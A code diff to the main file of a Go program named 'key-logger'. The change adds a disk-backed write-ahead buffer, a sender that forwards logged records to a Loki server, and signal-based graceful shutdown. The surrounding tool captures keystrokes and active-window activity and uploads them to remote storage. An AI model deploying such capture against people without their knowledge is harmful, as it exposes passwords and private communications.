@@ -4,8 +4,11 @@ import (
 	"flag"
 	"fmt"
 	"os"
+	"os/signal"
+	"path/filepath"
 	"regexp"
 	"strings"
+	"syscall"
 	"time"
 
 	gklog "github.com/go-kit/kit/log"
@@ -13,6 +16,7 @@ import (
 	"github.com/grafana/loki-client-go/loki"
 
 	"key-logger/pkg/activewindow"
+	"key-logger/pkg/buffer"
 	"key-logger/pkg/keylogger"
 	"key-logger/pkg/recorder"
 	s32 "key-logger/pkg/s3"
@@ -54,6 +58,12 @@ func main() {
 	var filters stringSlice
 	flag.Var(&filters, "filter", "regex filter to remove matching text from output (repeatable)")
 
+	// Buffer flags.
+	homeDir, _ := os.UserHomeDir()
+	defaultBufferDir := filepath.Join(homeDir, ".key-logger", "buffer")
+	bufferDir := flag.String("buffer-dir", defaultBufferDir, "directory for WAL buffer files")
+	bufferMaxMB := flag.Int("buffer-max-mb", 100, "maximum buffer size in megabytes")
+
 	lokiCfg := loki.Config{}
 	// Sets defaults as well as anything from the command line.
 	lokiCfg.RegisterFlags(flag.CommandLine)
@@ -93,15 +103,36 @@ func main() {
 		compiledFilters = append(compiledFilters, re)
 	}
 
-	// Build Loki client (needed for --output=loki and/or thumbnail uploads).
+	// Build Loki client (for best-effort thumbnail uploads).
 	lokiClient, err := loki.NewWithLogger(lokiCfg, logger)
 	if err != nil {
-		if *outputMode == "loki" {
-			level.Error(logger).Log("msg", "--output=loki requires a valid Loki client; provide --client.url", "err", err)
+		if *outputMode == "loki" && lokiCfg.URL.String() == "" {
+			level.Error(logger).Log("msg", "--output=loki requires --client.url", "err", err)
 			os.Exit(1)
 		}
 		level.Warn(logger).Log("msg", "Loki client not configured (thumbnails disabled)", "err", err)
 		lokiClient = nil
+	}
+
+	// Create WAL and sender when output mode is loki.
+	var wal *buffer.WAL
+	var sender *buffer.Sender
+	if *outputMode == "loki" {
+		lokiURL := lokiCfg.URL.String()
+		if lokiURL == "" {
+			level.Error(logger).Log("msg", "--output=loki requires --client.url")
+			os.Exit(1)
+		}
+		maxBytes := int64(*bufferMaxMB) * 1024 * 1024
+		wal, err = buffer.NewWAL(*bufferDir, maxBytes, logger)
+		if err != nil {
+			level.Error(logger).Log("msg", "failed to create WAL", "err", err)
+			os.Exit(1)
+		}
+		sender = buffer.NewSender(wal, lokiURL, lokiCfg.TenantID, logger)
+		go sender.Run()
+		level.Info(logger).Log("msg", "WAL buffer enabled",
+			"dir", *bufferDir, "max_mb", *bufferMaxMB, "loki_url", lokiURL)
 	}
 
 	s3 := s32.New(*endpoint, *accessKeyId, *secretKey, *bucketName)
@@ -144,12 +175,22 @@ func main() {
 		Filters:           compiledFilters,
 	}
 
-	rec := recorder.New(logger, recCfg, kl, wt, cap, s3, lokiClient)
+	rec := recorder.New(logger, recCfg, kl, wt, cap, s3, lokiClient, wal)
 	if err := rec.Start(); err != nil {
 		level.Error(logger).Log("msg", "error starting recorder", "err", err)
 		os.Exit(1)
 	}
 
-	// Block forever.
-	select {}
+	// Wait for termination signal for graceful shutdown.
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
+	sig := <-sigCh
+	level.Info(logger).Log("msg", "received signal, shutting down", "signal", sig)
+
+	if sender != nil {
+		sender.Stop()
+	}
+	if wal != nil {
+		wal.Close()
+	}
 }
